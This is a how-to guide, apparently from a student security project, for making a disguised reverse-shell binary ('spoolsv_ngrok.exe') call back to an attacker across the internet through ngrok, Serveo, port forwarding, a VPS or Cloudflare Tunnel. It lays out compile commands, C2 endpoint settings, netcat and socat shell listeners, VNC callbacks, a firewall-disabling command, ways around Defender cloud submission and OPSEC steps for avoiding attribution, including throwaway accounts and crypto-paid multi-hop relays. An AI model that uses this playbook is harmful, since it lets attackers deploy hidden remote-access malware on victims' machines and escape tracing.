# Cross-Network Callback Guide

**Victim stays on their own network. Callback works across the internet.**

---

## The Problem

Your original `spoolsv.exe` uses `192.168.1.92` — a **private IP address**. Private IPs only work when the victim and attacker are on the **same local network** (same WiFi, same router).

If the victim is on:
- Classroom WiFi (`192.168.1.x`)
- Home network (`10.0.0.x`)
- Mobile hotspot (`172.20.10.x`)
- Cafe WiFi (`192.168.43.x`)

...and you are on a **different** network, the private IP is unreachable.

**You need a public endpoint.**

---

## The Solution: Tunneling

**Concept:** The victim makes an **outbound** connection to a public server on the internet. That server forwards the traffic to your laptop.

```
[Victim Machine]          [Internet]           [Your Laptop]
   (Any Network)             (ngrok)            (Any Network)
       |                        |                     |
       |--- outbound TCP ----->|                     |
       |   to public endpoint   |                     |
       |                        |---- forwarded ----->|
       |                        |      traffic        |
       |<------- shell/cmd -----|<--------------------|
```

**Why this works:**
- Most firewalls block **inbound** connections (to you)
- Most firewalls allow **outbound** connections (from the victim)
- The victim initiates the connection — it looks like normal internet traffic
- The tunnel service (ngrok) bridges the two networks

**This is NOT an Evil Twin.**
- The victim does NOT connect to your WiFi
- The victim stays on their legitimate network
- The callback traverses the open internet

---

## How Tunneling Actually Works (Deep Dive)

### The Network Layer Perspective

At the TCP/IP level, here's what happens:

```
Layer 7 (Application):    Your malware calls connect("0.tcp.ngrok.io", 12345)
                              ↓
Layer 4 (Transport):      TCP SYN packet sent to ngrok's public IP
                              ↓
Layer 3 (Network):        IP packet routed across the internet
                              ↓
Layer 2/1 (Data Link):    Ethernet → ISP → Backbone → ngrok datacenter
                              ↓
ngrok edge server:        Receives TCP connection on port 12345
                              ↓
ngrok agent (your laptop): Existing TLS tunnel from agent to edge
                              ↓
Local forward:            ngrok agent forwards TCP to localhost:8080
                              ↓
Your listener:            netcat / Python / custom C2 on port 8080
```

### The ngrok Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         INTERNET                                    │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │              ngrok Global Edge Network                       │   │
│  │  ┌─────────┐    ┌─────────┐    ┌─────────┐                 │   │
│  │  │ Edge US │◄──►│ Edge EU │◄──►│ Edge AP │                 │   │
│  │  │  .io    │    │  .io    │    │  .io    │                 │   │
│  │  └────┬────┘    └────┬────┘    └────┬────┘                 │   │
│  │       └────────────────┴────────────┘                       │   │
│  │                    Anycast Network                            │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
         ▲                                              ▲
         │ TCP:12345                                     │ TLS Tunnel
         │                                               │
┌────────┴────────┐                              ┌───────┴────────┐
│  Victim Machine │                              │  Your Laptop   │
│                 │                              │                │
│ spoolsv_ngrok   │                              │ ngrok agent    │
│    .exe         │                              │   (ngrok.exe)  │
│                 │                              │                │
│ connects to     │                              │ forwards to    │
│ 0.tcp.ngrok.io  │                              │ localhost:8080 │
└─────────────────┘                              └────────────────┘
```

The ngrok agent on your laptop maintains a **persistent TLS tunnel** to ngrok's edge network. When a victim connects to the public endpoint, ngrok routes the traffic through this tunnel to your local port.

---

## Option 1: ngrok (Recommended)

**ngrok** is a tunneling service. It gives you a public `hostname:port` that forwards to your local machine.

### Step 1: Sign Up (Free)

1. Go to https://dashboard.ngrok.com/signup
2. Create a free account
3. Get your authtoken from https://dashboard.ngrok.com/get-started/your-authtoken

### Step 2: Download ngrok

1. Download Windows (64-bit) from https://dashboard.ngrok.com/get-started/setup/windows
2. Extract `ngrok.exe` to a folder (e.g., `C:\Tools\`)

### Step 3: Configure

Open PowerShell:
```powershell
cd C:\Tools
.\ngrok.exe config add-authtoken YOUR_TOKEN_HERE
```

### Step 4: Run Setup Script

```powershell
cd C:\Users\gwu07\Desktop\CSEC\CSEC_Final_Submission
.\Setup-NgrokC2.ps1 -NgrokPath C:\Tools\ngrok.exe -AuthToken YOUR_TOKEN_HERE
```

**What the script does:**
- Starts a TCP tunnel for port 8080 (shell)
- Starts a TCP tunnel for port 5500 (VNC)
- Displays the public endpoints
- Starts local listeners

**Example output:**
```
SHELL C2 Endpoint:  tcp://0.tcp.ngrok.io:12345
VNC Endpoint:       tcp://8.tcp.ngrok.io:67890
```

### Step 5: Recompile Binary with Public Endpoint

Edit `ORIGINALS/SOURCES/shadow_shell_ngrok.c`:
```c
#define C2_ENDPOINT   "0.tcp.ngrok.io:12345"
```

Compile:
```cmd
cd ORIGINALS\SOURCES
cl.exe shadow_shell_ngrok.c /Fe:spoolsv_ngrok.exe /O1 /GS- ws2_32.lib
```

### Step 6: Deploy and Execute

Copy `spoolsv_ngrok.exe` to USB. Victim runs it on **any network**.

The shell connects to `0.tcp.ngrok.io:12345` → ngrok forwards to your laptop's port 8080.

### VNC Command on Victim

```cmd
vncserver.exe -controlapp -connect 8.tcp.ngrok.io:67890
```

(Replace with your actual ngrok VNC endpoint.)

### ngrok Free Tier Deep Dive

**Limitations:**
- Random hostname/port every session (changes on restart)
- ~1 minute connection timeout for TCP tunnels
- Bandwidth limits (~1 GB/month)
- No custom domains
- US region only (for free tier)

**Workarounds for Class Demo:**
1. Start ngrok tunnels **right before** the demo
2. Recompile the binary with the new endpoint each time
3. Keep the demo under 5 minutes to avoid timeout issues
4. If tunnel expires mid-demo, restart ngrok and give the victim the new endpoint

**Pro tip:** For repeated demos, write a script that:
```powershell
# Auto-start ngrok, grab endpoint, patch source, recompile
$ngrok = Start-Process ngrok.exe -ArgumentList "tcp","8080" -PassThru
Start-Sleep -Seconds 3
$endpoint = (Invoke-RestMethod http://127.0.0.1:4040/api/tunnels).tunnels.public_url
# Parse endpoint → update C2_ENDPOINT → compile
```

---

## Option 2: Serveo (No Signup, No Install)

**Serveo** uses SSH for tunneling. No software installation required.

### Requirements
- Windows 10/11 has OpenSSH built-in
- Or use PuTTY/SSH client

### Step 1: Start Tunnel

Open PowerShell:
```powershell
# Shell tunnel
ssh -R 12345:localhost:8080 serveo.net

# VNC tunnel (in another window)
ssh -R 67890:localhost:5500 serveo.net
```

**Output:**
```
Forwarding TCP connection from serveo.net:12345
Forwarding TCP connection from serveo.net:67890
```

### Step 2: Use Endpoints

Edit binary:
```c
#define C2_ENDPOINT   "serveo.net:12345"
```

VNC command:
```cmd
vncserver.exe -controlapp -connect serveo.net:67890
```

**Limitations:**
- Serveo sometimes goes down
- SSH connection must stay open
- Less reliable than ngrok
- No dashboard or monitoring

---

## Option 3: Port Forwarding (If You Have Public IP)

If your home router has a **public IP address** (check https://www.whatismyip.com/):

### Step 1: Find Your Public IP
```cmd
curl https://api.ipify.org
```

### Step 2: Configure Router

Log into your router (usually `192.168.1.1` or `192.168.0.1`):
- Forward external port 8080 → your laptop's internal IP, port 8080
- Forward external port 5500 → your laptop's internal IP, port 5500

**Common router settings:**
```
Port Forwarding / Virtual Servers:
  Service Name: C2_Shell
  External Port: 8080
  Internal IP: 192.168.1.92 (your laptop)
  Internal Port: 8080
  Protocol: TCP

  Service Name: C2_VNC
  External Port: 5500
  Internal IP: 192.168.1.92
  Internal Port: 5500
  Protocol: TCP
```

### Step 3: Use Public IP in Binary

```c
#define C2_ENDPOINT   "203.0.113.45:8080"
```

**Checking if you have a public IP:**
```cmd
# Compare these two IPs
ipconfig              ← Your local IP (e.g., 192.168.1.92)
curl api.ipify.org    ← Your public IP (e.g., 203.0.113.45)

# If they differ, you're behind NAT. Port forwarding may not work.
```

### Dynamic DNS (DDNS)

If your public IP changes (most residential ISPs use dynamic IPs):

1. Sign up for free DDNS at https://www.noip.com/ or https://dynv6.com/
2. Create a hostname like `yourname.no-ip.com`
3. Install the DDNS updater on your laptop
4. Use the hostname in your binary:
   ```c
   #define C2_ENDPOINT "yourname.no-ip.com:8080"
   ```

---

## Option 4: Cloud VPS (Most Professional)

Rent a $5/month VPS (DigitalOcean, Linode, Vultr):

1. Create Ubuntu VPS
2. Install listener:
   ```bash
   # Persistent listener with netcat
   while true; do nc -lvp 8080; done
   ```
3. Use VPS public IP in binary:
   ```c
   #define C2_ENDPOINT   "your.vps.ip.address:8080"
   ```

### Setting Up a VPS Listener

```bash
#!/bin/bash
# save as listener.sh on your VPS

PORT=8080
LOG=/var/log/c2.log

echo "[+] Starting C2 listener on port $PORT"
while true; do
    echo "[+] Waiting for connection..." | tee -a $LOG
    nc -lvp $PORT | tee -a $LOG
    echo "[-] Connection closed. Restarting..." | tee -a $LOG
    sleep 1
done
```

Run it:
```bash
chmod +x listener.sh
nohup ./listener.sh &
```

### Making the VPS Listener Interactive

Netcat gives a raw socket. For an interactive shell:
```bash
# On VPS — start listener
nc -lvp 8080 -e /bin/bash

# Better: use socat for a proper PTY
socat TCP-LISTEN:8080,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Advantages:**
- Static IP never changes
- Professional infrastructure
- Can run 24/7
- Not dependent on your laptop being online
- No tunnel service logs linking to your identity

---

## Option 5: Cloudflare Tunnel (cloudflared)

**Cloudflare Tunnel** is a free alternative to ngrok with more features:

1. Install cloudflared: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/
2. Authenticate: `cloudflared tunnel login`
3. Create tunnel: `cloudflared tunnel create c2`
4. Configure routes:
   ```yaml
   # ~/.cloudflared/config.yml
   tunnel: <tunnel-id>
   credentials-file: ~/.cloudflared/<tunnel-id>.json
   ingress:
     - hostname: shell.yourdomain.com
       service: tcp://localhost:8080
     - hostname: vnc.yourdomain.com
       service: tcp://localhost:5500
   ```

**Advantages over ngrok:**
- Custom domain names
- No random endpoint changes
- More bandwidth
- Built into Cloudflare's global CDN

---

## Comparison Table

| Method | Setup Time | Reliability | Cost | Signup Required | Custom Domain |
|--------|-----------|-------------|------|-----------------|---------------|
| **ngrok** | 5 min | High | Free tier | Yes | No (free) |
| **Serveo** | 2 min | Medium | Free | No | No |
| **Port Forward** | 15 min | High (if you have public IP) | Free | No | DDNS optional |
| **Cloud VPS** | 30 min | Very High | ~$5/month | Yes | Yes |
| **Cloudflare Tunnel** | 20 min | Very High | Free | Yes | Yes |

---

## DNS Resolution in Malware

### Why `gethostbyname()` Matters

Your original `shadow_shell.c` used `inet_addr()` which only accepts IP addresses:
```c
addr.sin_addr.s_addr = inet_addr("192.168.1.92");  // IP only
```

`shadow_shell_ngrok.c` uses `gethostbyname()` which accepts hostnames:
```c
struct hostent *he = gethostbyname("0.tcp.ngrok.io");
addr.sin_addr = *((struct in_addr *)he->h_addr);  // Hostname OR IP
```

**This means the same binary works with:**
- IP addresses: `"192.168.1.92"`
- Hostnames: `"0.tcp.ngrok.io"`
- Dynamic DNS: `"yourname.no-ip.com"`
- Custom domains: `"shell.yourdomain.com"`

### Fallback DNS Resolution

For production malware, implement multiple resolution methods:
```c
// Try gethostbyname first (works with hostnames and IPs)
struct hostent *he = gethostbyname(C2_HOST);
if (he) {
    addr.sin_addr = *((struct in_addr *)he->h_addr);
} else {
    // Fallback to inet_addr (IP only)
    addr.sin_addr.s_addr = inet_addr(C2_HOST);
}
```

---

## Important Notes

### Cloud Submission Risk Returns

When the victim has internet (which they do for cross-network callbacks), **Defender can cloud-submit samples**.

**Mitigation:**
1. Use `svchost_update_test.exe` (test variant) for cross-network demos
2. Or run evasion FIRST, then deploy payload
3. Keep the demo brief (under 5 minutes)
4. Have mutated variants ready

### Network Forensics Considerations

**What a defender sees on the victim's machine:**
```
netstat -anob | findstr "ESTABLISHED"
  TCP  192.168.1.50:49231  3.134.25.45:12345  ESTABLISHED  [spoolsv_ngrok.exe]
```

The connection goes to `3.134.25.45` (an AWS IP — ngrok's infrastructure). Reverse DNS might show `0.tcp.ngrok.io`.

**What a defender sees on the network:**
- Outbound TCP to ngrok/AWS IP ranges
- Looks like a user connecting to a web service
- No abnormal port (you're using 8080 or 443)
- No large data transfers (shells are low-bandwidth)

### OPSEC for Tunneling

1. **Never use the same ngrok account for multiple operations**
   - Free accounts are disposable. Create a new one per demo.

2. **Delete tunnels after use**
   ```powershell
   ngrok kill  # Stops all tunnels
   ```

3. **Monitor for unexpected connections**
   - Check the ngrok web interface (http://127.0.0.1:4040)
   - If someone else connects, your endpoint is compromised

4. **Use TLS where possible**
   - ngrok's TLS tunnels encrypt the connection to the edge
   - This prevents network-level inspection of your C2 traffic

5. **Rotate everything**
   - New ngrok account
   - New endpoint
   - New compiled binary (different hash)
   - Every single time

---

## Troubleshooting

### Problem: ngrok tunnel starts but victim can't connect

**Check:**
1. Is the victim actually online? `ping 8.8.8.8` on victim
2. Is the endpoint correct? Copy-paste from ngrok output
3. Is your local listener running? `netstat -an | findstr "8080"`
4. Is Windows Firewall blocking localhost? `netsh advfirewall set allprofiles state off` (temporarily)
5. Is the port in the binary correct? Recompile with exact endpoint

### Problem: Connection drops after 1 minute

**Cause:** ngrok free tier has connection timeouts.

**Fix:**
- Use `ngrok tcp --region=us 8080` to specify a closer region
- Keep the payload active (send periodic data)
- Upgrade to ngrok Pro for persistent connections

### Problem: Serveo is down

**Fix:** Serveo is a free hobby project with no SLA. Have ngrok as a backup.

### Problem: Port forwarding doesn't work

**Check:**
1. Is your ISP using CGNAT? (Compare public IP vs router WAN IP)
2. Is the port correctly forwarded to your laptop's internal IP?
3. Is Windows Firewall blocking the port?
4. Is your laptop's IP static? (Router DHCP may have changed it)

### Problem: Binary can't resolve hostname

**Check:**
1. Does the victim have DNS working? `nslookup 0.tcp.ngrok.io`
2. Is `_WINSOCK_DEPRECATED_NO_WARNINGS` defined?
3. Is `ws2_32.lib` linked?
4. Try hardcoding the IP temporarily to test connectivity

---

## Quick Start Cheat Sheet

```powershell
# 1. Start ngrok tunnels
ngrok tcp 8080
ngrok tcp 5500

# 2. Note the public endpoints
# Example: tcp://0.tcp.ngrok.io:12345

# 3. Edit source
notepad ORIGINALS\SOURCES\shadow_shell_ngrok.c
# Change: #define C2_ENDPOINT "0.tcp.ngrok.io:12345"

# 4. Compile
cl.exe shadow_shell_ngrok.c /Fe:spoolsv_ngrok.exe /O1 /GS- ws2_32.lib

# 5. Deploy to victim (any network)
spoolsv_ngrok.exe

# 6. Shell arrives on your laptop regardless of victim's network
```

---

## Advanced Scenario: Multi-Hop Tunneling

For maximum OPSEC, chain multiple tunnels:

```
[Victim] ──► [ngrok] ──► [VPS] ──► [Your Laptop]

1. Victim connects to ngrok endpoint
2. ngrok forwards to a cloud VPS you control
3. The VPS forwards to your laptop via another tunnel (WireGuard, SSH, etc.)
4. If ngrok logs are subpoenaed, they only show the VPS IP
5. The VPS is a throwaway instance paid with crypto
```

This is overkill for a classroom demo but illustrates how real APTs operate.

---

*"The victim never connects to your network. They connect to the internet. The internet connects to you."*
